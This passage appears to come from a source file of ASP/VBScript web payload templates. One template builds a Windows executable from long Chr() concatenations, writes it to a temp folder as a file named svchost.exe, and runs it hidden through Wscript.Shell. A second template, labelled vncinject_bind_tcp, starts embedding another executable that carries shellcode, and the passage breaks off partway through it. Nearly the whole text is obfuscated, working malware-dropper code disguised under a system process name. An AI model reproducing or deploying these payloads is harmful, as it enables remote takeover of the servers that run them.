GqnqCn=GqnqCn&Chr(102)&Chr(116)&Chr(45)&Chr(99)&Chr(111)&Chr(109)&Chr(58)&Chr(97)&Chr(115)&Chr(109)&Chr(46)&Chr(118)&Chr(49)&Chr(34)&Chr(32)&Chr(109)&Chr(97)&Chr(110)&Chr(105)&Chr(102)&Chr(101)&Chr(115)&Chr(116)&Chr(86)&Chr(101)&Chr(114)&Chr(115)&Chr(105)&Chr(111)&Chr(110)&Chr(61)&Chr(34)&Chr(49)&Chr(46)&Chr(48)&Chr(34)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(60)&Chr(116)&Chr(114)&Chr(117)&Chr(115)&Chr(116)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(32)&Chr(120)&Chr(109)&Chr(108)&Chr(110)&Chr(115)&Chr(61)&Chr(34)&Chr(117)&Chr(114)&Chr(110)&Chr(58)&Chr(115)&Chr(99)&Chr(104)&Chr(101)&Chr(109)&Chr(97)&Chr(115)&Chr(45)&Chr(109)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)&Chr(102)&Chr(116)&Chr(45)&Chr(99)&Chr(111)&Chr(109)&Chr(58)&Chr(97)&Chr(115)&Chr(109)&Chr(46)&Chr(118)&Chr(51)&Chr(34)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(60)
GqnqCn=GqnqCn&Chr(115)&Chr(101)&Chr(99)&Chr(117)&Chr(114)&Chr(105)&Chr(116)&Chr(121)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(60)&Chr(114)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(101)&Chr(100)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(105)&Chr(108)&Chr(101)&Chr(103)&Chr(101)&Chr(115)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(60)&Chr(114)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(101)&Chr(100)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(117)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(76)&Chr(101)&Chr(118)&Chr(101)&Chr(108)&Chr(32)&Chr(108)&Chr(101)&Chr(118)&Chr(101)&Chr(108)&Chr(61)&Chr(34)&Chr(97)&Chr(115)&Chr(73)&Chr(110)&Chr(118)&Chr(111)&Chr(107)&Chr(101)&Chr(114)&Chr(34)&Chr(32)&Chr(117)&Chr(105)&Chr(65)&Chr(99)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(61)
GqnqCn=GqnqCn&Chr(34)&Chr(102)&Chr(97)&Chr(108)&Chr(115)&Chr(101)&Chr(34)&Chr(62)&Chr(60)&Chr(47)&Chr(114)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(101)&Chr(100)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(117)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(76)&Chr(101)&Chr(118)&Chr(101)&Chr(108)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(60)&Chr(47)&Chr(114)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(101)&Chr(100)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(105)&Chr(108)&Chr(101)&Chr(103)&Chr(101)&Chr(115)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(60)&Chr(47)&Chr(115)&Chr(101)&Chr(99)&Chr(117)&Chr(114)&Chr(105)&Chr(116)&Chr(121)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(60)&Chr(47)&Chr(116)&Chr(114)&Chr(117)&Chr(115)&Chr(116)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(62)&Chr(13)&Chr(10)&Chr(60)
GqnqCn=GqnqCn&Chr(47)&Chr(97)&Chr(115)&Chr(115)&Chr(101)&Chr(109)&Chr(98)&Chr(108)&Chr(121)&Chr(62)&Chr(80)&Chr(65)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(88)&Chr(88)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(88)&Chr(88)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(88)&Chr(88)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(88)&Chr(88)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(88)&Chr(88)&Chr(80)&Chr(65)&Chr(68)
Dim IiqeNlHyP
Set IiqeNlHyP = CreateObject("Scripting.FileSystemObject")
Dim fhhekKnDrbVZ
Dim UhJvwrWwa
Dim qYsGYuWQbAFaaY
Dim aNozQAHd
Set UhJvwrWwa = IiqeNlHyP.GetSpecialFolder(2)
aNozQAHd = UhJvwrWwa & "\\" & IiqeNlHyP.GetTempName()
IiqeNlHyP.CreateFolder(aNozQAHd)
qYsGYuWQbAFaaY = aNozQAHd & "\\" & "svchost.exe"
Set fhhekKnDrbVZ = IiqeNlHyP.CreateTextFile(qYsGYuWQbAFaaY,2,0)
fhhekKnDrbVZ.Write GqnqCn
fhhekKnDrbVZ.Close
Dim NhAnOhrkvAmw
Set NhAnOhrkvAmw = CreateObject("Wscript.Shell")
NhAnOhrkvAmw.run qYsGYuWQbAFaaY, 0, false
End Sub
DNPAUOmddZViB
%>
"""

vncinject_bind_tcp   = """
<%
Sub vhlORMNVu()
ySXd=Chr(77)&Chr(90)&Chr(144)&Chr(0)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(184)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(224)&Chr(0)&Chr(0)&Chr(0)&Chr(14)&Chr(31)&Chr(186)&Chr(14)&Chr(0)&Chr(180)&Chr(9)&Chr(205)&Chr(33)&Chr(184)&Chr(1)&Chr(76)&Chr(205)&Chr(33)&Chr(84)&Chr(104)&Chr(105)&Chr(115)&Chr(32)&Chr(112)&Chr(114)&Chr(111)&Chr(103)&Chr(114)&Chr(97)&Chr(109)&Chr(32)&Chr(99)&Chr(97)&Chr(110)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(98)&Chr(101)
ySXd=ySXd&Chr(32)&Chr(114)&Chr(117)&Chr(110)&Chr(32)&Chr(105)&Chr(110)&Chr(32)&Chr(68)&Chr(79)&Chr(83)&Chr(32)&Chr(109)&Chr(111)&Chr(100)&Chr(101)&Chr(46)&Chr(13)&Chr(13)&Chr(10)&Chr(36)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(154)&Chr(70)&Chr(50)&Chr(175)&Chr(251)&Chr(40)&Chr(97)&Chr(175)&Chr(251)&Chr(40)&Chr(97)&Chr(175)&Chr(251)&Chr(40)&Chr(97)&Chr(177)&Chr(169)&Chr(172)&Chr(97)&Chr(181)&Chr(251)&Chr(40)&Chr(97)&Chr(177)&Chr(169)&Chr(189)&Chr(97)&Chr(191)&Chr(251)&Chr(40)&Chr(97)&Chr(177)&Chr(169)&Chr(171)&Chr(97)&Chr(230)&Chr(251)&Chr(40)&Chr(97)&Chr(136)&Chr(61)&Chr(83)&Chr(97)&Chr(172)&Chr(251)&Chr(40)&Chr(97)&Chr(175)&Chr(251)&Chr(41)&Chr(97)&Chr(230)&Chr(251)&Chr(40)&Chr(97)&Chr(177)&Chr(169)&Chr(162)&Chr(97)&Chr(174)&Chr(251)&Chr(40)&Chr(97)&Chr(177)&Chr(169)&Chr(185)&Chr(97)&Chr(174)&Chr(251)&Chr(40)&Chr(97)
ySXd=ySXd&Chr(82)&Chr(105)&Chr(99)&Chr(104)&Chr(175)&Chr(251)&Chr(40)&Chr(97)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(69)&Chr(0)&Chr(0)&Chr(76)&Chr(1)&Chr(4)&Chr(0)&Chr(252)&Chr(182)&Chr(220)&Chr(74)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(224)&Chr(0)&Chr(3)&Chr(1)&Chr(11)&Chr(1)&Chr(9)&Chr(0)&Chr(0)&Chr(100)&Chr(0)&Chr(0)&Chr(0)&Chr(44)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(109)&Chr(73)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(5)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(5)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(208)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(100)&Chr(149)&Chr(0)&Chr(0)&Chr(40)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(192)&Chr(0)&Chr(0)&Chr(180)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(104)&Chr(146)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(232)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(46)&Chr(116)&Chr(101)&Chr(120)&Chr(116)&Chr(0)&Chr(0)&Chr(0)&Chr(36)&Chr(98)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(100)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(96)&Chr(46)&Chr(114)&Chr(100)&Chr(97)&Chr(116)&Chr(97)&Chr(0)&Chr(0)&Chr(162)&Chr(26)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(28)&Chr(0)&Chr(0)&Chr(0)&Chr(104)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(64)&Chr(46)&Chr(100)&Chr(97)&Chr(116)&Chr(97)&Chr(0)&Chr(0)&Chr(0)&Chr(252)&Chr(23)&Chr(0)&Chr(0)&Chr(0)&Chr(160)&Chr(0)&Chr(0)&Chr(0)&Chr(14)&Chr(0)&Chr(0)&Chr(0)&Chr(132)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(192)&Chr(46)&Chr(114)&Chr(115)&Chr(114)&Chr(99)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(180)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(146)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(194)&Chr(16)&Chr(0)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(61)&Chr(104)&Chr(172)&Chr(64)&Chr(0)&Chr(1)&Chr(117)&Chr(5)&Chr(232)&Chr(209)&Chr(6)&Chr(0)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(30)&Chr(5)&Chr(0)&Chr(0)&Chr(104)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(96)&Chr(2)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(93)&Chr(195)&Chr(106)&Chr(88)&Chr(104)&Chr(208)&Chr(146)&Chr(64)&Chr(0)&Chr(232)&Chr(128)&Chr(21)&Chr(0)&Chr(0)&Chr(51)&Chr(246)&Chr(137)&Chr(117)&Chr(252)&Chr(141)&Chr(69)&Chr(152)&Chr(80)&Chr(255)&Chr(21)&Chr(4)&Chr(128)&Chr(64)&Chr(0)&Chr(106)&Chr(254)&Chr(95)&Chr(137)&Chr(125)
ySXd=ySXd&Chr(252)&Chr(184)&Chr(77)&Chr(90)&Chr(0)&Chr(0)&Chr(102)&Chr(57)&Chr(5)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(117)&Chr(56)&Chr(161)&Chr(60)&Chr(0)&Chr(64)&Chr(0)&Chr(129)&Chr(184)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(80)&Chr(69)&Chr(0)&Chr(0)&Chr(117)&Chr(39)&Chr(185)&Chr(11)&Chr(252)&Chr(232)&Chr(194)&Chr(0)&Chr(0)&Chr(0)&Chr(96)&Chr(137)&Chr(229)&Chr(49)&Chr(210)&Chr(144)&Chr(100)&Chr(139)&Chr(82)&Chr(48)&Chr(139)&Chr(82)&Chr(12)&Chr(144)&Chr(139)&Chr(82)&Chr(20)&Chr(144)&Chr(139)&Chr(114)&Chr(40)&Chr(15)&Chr(183)&Chr(74)&Chr(38)&Chr(49)&Chr(255)&Chr(144)&Chr(49)&Chr(192)&Chr(235)&Chr(1)&Chr(153)&Chr(172)&Chr(60)&Chr(97)&Chr(124)&Chr(2)&Chr(44)&Chr(32)&Chr(193)&Chr(207)&Chr(13)&Chr(1)&Chr(199)&Chr(144)&Chr(226)&Chr(236)&Chr(144)&Chr(82)&Chr(87)&Chr(235)&Chr(6)&Chr(105)&Chr(180)&Chr(88)&Chr(194)&Chr(211)&Chr(233)&Chr(139)
ySXd=ySXd&Chr(82)&Chr(16)&Chr(144)&Chr(139)&Chr(66)&Chr(60)&Chr(1)&Chr(208)&Chr(139)&Chr(64)&Chr(120)&Chr(144)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(98)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(208)&Chr(80)&Chr(144)&Chr(139)&Chr(72)&Chr(24)&Chr(139)&Chr(88)&Chr(32)&Chr(144)&Chr(1)&Chr(211)&Chr(144)&Chr(227)&Chr(80)&Chr(144)&Chr(73)&Chr(144)&Chr(139)&Chr(52)&Chr(139)&Chr(1)&Chr(214)&Chr(49)&Chr(255)&Chr(49)&Chr(192)&Chr(172)&Chr(193)&Chr(207)&Chr(13)&Chr(235)&Chr(8)&Chr(75)&Chr(113)&Chr(108)&Chr(255)&Chr(23)&Chr(95)&Chr(148)&Chr(150)&Chr(1)&Chr(199)&Chr(56)&Chr(224)&Chr(117)&Chr(234)&Chr(3)&Chr(125)&Chr(248)&Chr(144)&Chr(59)&Chr(125)&Chr(36)&Chr(144)&Chr(117)&Chr(211)&Chr(144)&Chr(88)&Chr(235)&Chr(1)&Chr(153)&Chr(139)&Chr(88)&Chr(36)&Chr(1)&Chr(211)&Chr(102)&Chr(139)&Chr(12)&Chr(75)&Chr(144)&Chr(139)&Chr(88)&Chr(28)&Chr(1)&Chr(211)&Chr(139)&Chr(4)
ySXd=ySXd&Chr(139)&Chr(1)&Chr(208)&Chr(137)&Chr(68)&Chr(36)&Chr(36)&Chr(91)&Chr(144)&Chr(91)&Chr(97)&Chr(89)&Chr(90)&Chr(81)&Chr(255)&Chr(224)&Chr(88)&Chr(144)&Chr(95)&Chr(90)&Chr(139)&Chr(18)&Chr(233)&Chr(87)&Chr(255)&Chr(255)&Chr(255)&Chr(235)&Chr(5)&Chr(10)&Chr(183)&Chr(43)&Chr(162)&Chr(33)&Chr(93)&Chr(190)&Chr(70)&Chr(1)&Chr(0)&Chr(0)&Chr(144)&Chr(106)&Chr(64)&Chr(104)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(86)&Chr(106)&Chr(0)&Chr(104)&Chr(88)&Chr(164)&Chr(83)&Chr(229)&Chr(235)&Chr(7)&Chr(38)&Chr(6)&Chr(5)&Chr(236)&Chr(39)&Chr(124)&Chr(23)&Chr(255)&Chr(213)&Chr(137)&Chr(195)&Chr(137)&Chr(199)&Chr(144)&Chr(137)&Chr(241)&Chr(232)&Chr(58)&Chr(0)&Chr(0)&Chr(0)&Chr(144)&Chr(235)&Chr(1)&Chr(172)&Chr(94)&Chr(242)&Chr(164)&Chr(232)&Chr(31)&Chr(0)&Chr(0)&Chr(0)&Chr(187)&Chr(224)&Chr(29)&Chr(42)&Chr(10)&Chr(104)&Chr(166)&Chr(149)&Chr(189)
ySXd=ySXd&Chr(157)&Chr(255)&Chr(213)&Chr(60)&Chr(6)&Chr(124)&Chr(10)&Chr(128)&Chr(251)&Chr(224)&Chr(117)&Chr(5)&Chr(187)&Chr(71)&Chr(19)&Chr(114)&Chr(111)&Chr(106)&Chr(0)&Chr(83)&Chr(255)&Chr(213)&Chr(49)&Chr(192)&Chr(100)&Chr(255)&Chr(48)&Chr(100)&Chr(137)&Chr(32)&Chr(255)&Chr(211)&Chr(233)&Chr(210)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(193)&Chr(255)&Chr(255)&Chr(255)&Chr(187)&Chr(39)&Chr(140)&Chr(232)&Chr(214)&Chr(218)&Chr(218)&Chr(217)&Chr(116)&Chr(36)&Chr(244)&Chr(94)&Chr(43)&Chr(201)&Chr(177)&Chr(75)&Chr(131)&Chr(238)&Chr(252)&Chr(49)&Chr(94)&Chr(17)&Chr(3)&Chr(94)&Chr(17)&Chr(226)&Chr(210)&Chr(112)&Chr(0)&Chr(95)&Chr(28)&Chr(137)&Chr(209)&Chr(0)&Chr(149)&Chr(108)&Chr(224)&Chr(18)&Chr(193)&Chr(229)&Chr(81)&Chr(163)&Chr(130)&Chr(168)&Chr(89)&Chr(72)&Chr(198)&Chr(88)&Chr(233)&Chr(60)&Chr(206)&Chr(111)&Chr(90)&Chr(138)&Chr(40)&Chr(65)&Chr(91)&Chr(58)
ySXd=ySXd&Chr(244)&Chr(13)&Chr(159)&Chr(92)&Chr(136)&Chr(79)&Chr(204)&Chr(190)&Chr(177)&Chr(159)&Chr(1)&Chr(190)&Chr(246)&Chr(194)&Chr(234)&Chr(146)&Chr(175)&Chr(137)&Chr(89)&Chr(3)&Chr(196)&Chr(204)&Chr(97)&Chr(34)&Chr(10)&Chr(91)&Chr(217)&Chr(92)&Chr(47)&Chr(156)&Chr(174)&Chr(214)&Chr(46)&Chr(205)&Chr(31)&Chr(108)&Chr(120)&Chr(245)&Chr(20)&Chr(42)&Chr(88)&Chr(4)&Chr(248)&Chr(40)&Chr(164)&Chr(79)&Chr(117)&Chr(154)&Chr(95)&Chr(78)&Chr(95)&Chr(210)&Chr(160)&Chr(96)&Chr(159)&Chr(185)&Chr(159)&Chr(76)&Chr(18)&Chr(195)&Chr(216)&Chr(107)&Chr(205)&Chr(182)&Chr(18)&Chr(136)&Chr(112)&Chr(193)&Chr(225)&Chr(242)&Chr(174)&Chr(68)&Chr(247)&Chr(85)&Chr(36)&Chr(254)&Chr(211)&Chr(100)&Chr(233)&Chr(153)&Chr(144)&Chr(107)&Chr(70)&Chr(237)&Chr(254)&Chr(111)&Chr(89)&Chr(34)&Chr(117)&Chr(139)&Chr(210)&Chr(197)&Chr(89)&Chr(29)&Chr(160)&Chr(225)&Chr(125)&Chr(69)&Chr(114)&Chr(139)
